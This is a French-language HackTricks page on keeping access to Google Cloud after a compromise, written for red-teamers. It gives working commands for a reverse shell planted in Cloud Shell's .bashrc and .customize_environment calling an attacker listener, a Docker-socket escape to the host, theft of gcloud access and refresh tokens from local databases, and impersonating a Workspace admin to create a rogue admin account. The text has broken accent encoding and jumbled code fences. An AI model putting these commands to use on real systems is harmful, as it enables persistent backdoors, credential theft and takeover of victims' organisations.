# GCP - Persistance Non-svc

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Ces techniques sont utiles une fois que, d'une mani√®re ou d'une autre, vous avez compromis des identifiants GCP ou une machine fonctionnant dans un environnement GCP.

## Google‚Äôs Cloud Shell <a href="#e5eb" id="e5eb"></a>

### Backdoor Persistant

[**Google Cloud Shell**](https://cloud.google.com/shell/) vous offre un acc√®s en ligne de commande √† vos ressources cloud directement depuis votre navigateur sans aucun co√ªt associ√©.

Vous pouvez acc√©der √† Google's Cloud Shell depuis la **console web** ou en ex√©cutant **`gcloud cloud-shell ssh`**.

Cette console a des capacit√©s int√©ressantes pour les attaquants :

1. **Tout utilisateur Google ayant acc√®s √† Google Cloud** a acc√®s √† une instance Cloud Shell enti√®rement authentifi√©e.
2. Cette instance **conservera son r√©pertoire personnel pendant au moins 120 jours** si aucune activit√© n'est d√©tect√©e.
3. Il n'y a **aucune capacit√© pour une organisation de surveiller** l'activit√© de cette instance.

Cela signifie essentiellement qu'un attaquant peut placer une porte d√©rob√©e dans le r√©pertoire personnel de l'utilisateur et tant que l'utilisateur se connecte au GC Shell tous les 120 jours au moins, la porte d√©rob√©e survivra et l'attaquant obtiendra un shell √† chaque fois qu'il est ex√©cut√© simplement en faisant :
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
Il y a un autre fichier dans le dossier personnel appel√© **`.customize_environment`** qui, s'il existe, sera **ex√©cut√© √† chaque fois** que l'utilisateur acc√®de au **cloud shell** (comme dans la technique pr√©c√©dente). Il suffit d'ins√©rer le backdoor pr√©c√©dent ou un autre similaire pour maintenir la persistance tant que l'utilisateur utilise "fr√©quemment" le cloud shell :
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
Notez que **la premi√®re fois qu'une action n√©cessitant une authentification est effectu√©e dans Cloud Shell**, une fen√™tre d'autorisation **appara√Æt** dans le navigateur de l'utilisateur qui doit √™tre accept√©e avant que la commande ne s'ex√©cute. Si un pop-up inattendu appara√Æt, la cible pourrait devenir m√©fiante et compromettre la m√©thode de persistance.
{% endhint %}

### √âvasion de Conteneur Google Cloud Shell

Notez que le Google Cloud Shell s'ex√©cute √† l'int√©rieur d'un conteneur, vous pouvez **facilement vous √©chapper vers l'h√¥te** en faisant :
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
```markdown
Ceci n'est pas consid√©r√© comme une vuln√©rabilit√© par Google, mais cela vous donne une vision plus large de ce qui se passe dans cet environnement.

De plus, remarquez que depuis l'h√¥te, vous pouvez trouver un jeton de compte de service :
```
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
Avec les scopes suivants :
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## D√©tournement de Token

### Utilisateur Authentifi√©

Si vous parvenez √† acc√©der au dossier personnel d'un **utilisateur authentifi√© dans GCP**, par **d√©faut**, vous pourrez **obtenir des tokens pour cet utilisateur aussi longtemps que vous le souhaitez** sans avoir besoin de vous authentifier et ind√©pendamment de la machine depuis laquelle vous utilisez ses tokens et m√™me si l'utilisateur a configur√© l'A2F.

Cela est d√ª au fait que par d√©faut vous **pourrez utiliser le token de rafra√Æchissement aussi longtemps** que vous le souhaitez pour g√©n√©rer de nouveaux tokens.

Pour obtenir le token actuel d'un utilisateur, vous pouvez ex√©cuter :

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
Pour obtenir les d√©tails n√©cessaires √† la g√©n√©ration d'un nouveau jeton d'acc√®s, ex√©cutez :
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```markdown
{% endcode %}

Pour obtenir un nouveau jeton d'acc√®s actualis√© avec le jeton de rafra√Æchissement, l'ID client et le secret client, ex√©cutez :

{% code overflow="wrap" %}
```
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

### Comptes de service

Tout comme avec les utilisateurs authentifi√©s, si vous parvenez √† **compromettre le fichier de cl√© priv√©e** d'un compte de service, vous pourrez **y acc√©der g√©n√©ralement aussi longtemps que vous le souhaitez**.\
Cependant, si vous d√©robez le **jeton OAuth** d'un compte de service, cela peut √™tre encore plus int√©ressant, car, m√™me si par d√©faut ces jetons ne sont utiles que pendant une heure, si la **victime supprime la cl√© API priv√©e, le jeton OAuth restera valide jusqu'√† son expiration**.

### M√©tadonn√©es

√âvidemment, tant que vous √™tes √† l'int√©rieur d'une machine fonctionnant dans l'environnement GCP, vous pourrez **acc√©der au compte de service associ√© √† cette machine en contactant le point de terminaison des m√©tadonn√©es** (notez que les jetons OAuth auxquels vous pouvez acc√©der via ce point de terminaison sont g√©n√©ralement restreints par des port√©es).

### Rem√©diations

Certaines rem√©diations pour ces techniques sont expliqu√©es dans [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## Contournement des port√©es d'acc√®s <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

Lorsque des [port√©es d'acc√®s](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam) sont utilis√©es, le jeton OAuth g√©n√©r√© pour l'instance de calcul (VM) **aura une limitation de** [**port√©e**](https://oauth.net/2/scope/) **incluse**. Cependant, vous pourriez √™tre capable de **contourner** cette limitation et d'exploiter les permissions du compte compromis.

La **meilleure fa√ßon de contourner** cette restriction est soit de **trouver de nouvelles informations d'identification** sur l'h√¥te compromis, de **trouver la cl√© de service pour g√©n√©rer un jeton OAuth** sans restriction ou de **passer √† une VM diff√©rente moins restreinte**.

**Exploiter une autre machine**

Il est possible qu'une autre machine dans l'environnement existe avec des port√©es d'acc√®s moins restrictives. Si vous pouvez voir la sortie de `gcloud compute instances list --quiet --format=json`, cherchez des instances avec soit la port√©e sp√©cifique que vous voulez, soit la port√©e tout-inclus **`auth/cloud-platform`**.

Gardez √©galement un ≈ìil sur les instances qui ont le compte de service par d√©faut assign√© (`PROJECT_NUMBER-compute@developer.gserviceaccount.com`).

**Rechercher des cl√©s de compte de service**

Google d√©clare tr√®s clairement [**"Les port√©es d'acc√®s ne sont pas un m√©canisme de s√©curit√©‚Ä¶ elles n'ont aucun effet lors de requ√™tes non authentifi√©es via OAuth"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam).

Par cons√©quent, si vous **trouvez une** [**cl√© de compte de service**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys) stock√©e sur l'instance, vous pouvez contourner la limitation. Ce sont des **cl√©s priv√©es RSA** qui peuvent √™tre utilis√©es pour s'authentifier √† l'API Google Cloud et **demander un nouveau jeton OAuth sans limitations de port√©e**.

V√©rifiez si un compte de service a export√© une cl√© √† un moment donn√© avec :
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
Ces fichiers **ne sont pas stock√©s par d√©faut sur une instance Compute**, donc il faudrait avoir de la chance pour les rencontrer. Le nom par d√©faut du fichier est `[project-id]-[portion-of-key-id].json`. Donc, si le nom de votre projet est `test-project`, vous pouvez **rechercher dans le syst√®me de fichiers `test-project*.json`** √† la recherche de ce fichier de cl√©.

Le contenu du fichier ressemble √† ceci :
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
Ou, si **g√©n√©r√©s depuis le CLI**, ils ressembleront √† ceci :
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
Si vous trouvez l'un de ces fichiers, vous pouvez indiquer √† la commande **`gcloud` de se r√©-authentifier** avec ce compte de service. Vous pouvez le faire sur l'instance, ou sur n'importe quelle machine qui a les outils install√©s.
```bash
gcloud auth activate-service-account --key-file [FILE]
```
Vous pouvez maintenant **tester votre nouveau jeton OAuth** comme suit :
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
Vous devriez voir `https://www.googleapis.com/auth/cloud-platform` list√© dans les scopes, ce qui signifie que vous **n'√™tes pas limit√© par des scopes d'acc√®s au niveau de l'instance**. Vous avez maintenant le plein pouvoir d'utiliser toutes vos permissions IAM attribu√©es.

## Propagation vers Workspace via la d√©l√©gation de l'autorit√© √† l'√©chelle du domaine <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) est la **plateforme de collaboration et de productivit√©** de Google qui comprend des √©l√©ments tels que Gmail, Google Calendar, Google Drive, Google Docs, etc.

Les **comptes de service** dans GCP peuvent se voir accorder les **droits d'acc√©der programmatiquement aux donn√©es des utilisateurs** dans Workspace en se faisant passer pour des utilisateurs l√©gitimes. Cela est connu sous le nom de [d√©l√©gation √† l'√©chelle du domaine](https://developers.google.com/admin-sdk/reports/v1/guides/delegation). Cela inclut des actions telles que **lire** les **emails** dans Gmail, acc√©der √† Google Docs, et m√™me cr√©er de nouveaux comptes utilisateurs dans l'organisation G Suite.

Workspace dispose de [sa propre API](https://developers.google.com/gsuite/aspects/apis), compl√®tement s√©par√©e de GCP. Les permissions sont accord√©es √† Workspace et **il n'y a pas de relation par d√©faut entre GCP et Workspace**.

Cependant, il est possible de **donner** √† un compte de service des **permissions** sur un utilisateur de Workspace. Si vous avez acc√®s √† l'interface Web √† ce stade, vous pouvez naviguer vers **IAM -> Comptes de service** et voir si certains des comptes ont **"Activ√©" list√© sous la colonne "d√©l√©gation √† l'√©chelle du domaine"**. La colonne elle-m√™me peut **ne pas appara√Ætre si aucun compte n'est activ√©** (vous pouvez lire les d√©tails de chaque compte de service pour le confirmer). √Ä l'heure actuelle, il n'existe aucun moyen de faire cela programmatiquement, bien qu'il y ait une [demande pour cette fonctionnalit√©](https://issuetracker.google.com/issues/116182848) dans le suivi des bugs de Google.

Pour cr√©er cette relation, il est n√©cessaire de **l'activer dans GCP et aussi dans Workforce**.

#### Tester l'acc√®s √† Workspace

Pour tester cet acc√®s, vous aurez besoin des **identifiants du compte de service export√©s au format JSON**. Vous avez peut-√™tre acquis ces informations lors d'une √©tape pr√©c√©dente, ou vous avez peut-√™tre maintenant l'acc√®s requis pour cr√©er une cl√© pour un compte de service dont vous savez qu'il a la d√©l√©gation √† l'√©chelle du domaine activ√©e.

Ce sujet est un peu d√©licat‚Ä¶ votre compte de service a quelque chose appel√© "client\_email" que vous pouvez voir dans le fichier d'identification JSON que vous exportez. Il ressemble probablement √† quelque chose comme `account-name@project-name.iam.gserviceaccount.com`. Si vous essayez d'acc√©der directement aux appels d'API de Workforce avec cet email, m√™me avec la d√©l√©gation activ√©e, vous √©chouerez. C'est parce que l'annuaire Workforce n'inclura pas les adresses email des comptes de service GCP. Au lieu de cela, pour interagir avec Workforce, nous devons r√©ellement nous faire passer pour des utilisateurs Workforce valides.

Ce que vous voulez vraiment faire, c'est **vous faire passer pour un utilisateur ayant un acc√®s administratif**, puis utiliser cet acc√®s pour faire quelque chose comme **r√©initialiser un mot de passe, d√©sactiver l'authentification √† plusieurs facteurs, ou juste vous cr√©er un nouveau compte admin tout neuf**.

Gitlab a cr√©√© [ce script Python](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py) qui peut faire deux choses - lister l'annuaire des utilisateurs et cr√©er un nouveau compte administratif. Voici comment vous l'utiliseriez :
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
Vous pouvez essayer ce script sur une s√©rie d'adresses e-mail pour **impersonate** **various** **users**. La sortie standard indiquera si le compte de service a acc√®s √† Workforce, et inclura un **random password for the new admin account** si un est cr√©√©.

Si vous r√©ussissez √† cr√©er un nouveau compte admin, vous pouvez vous connecter √† la [console d'administration Google](https://admin.google.com) et avoir un contr√¥le total sur tout dans G Suite pour chaque utilisateur - e-mail, documents, calendrier, etc. L√¢chez-vous.

## R√©f√©rences

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
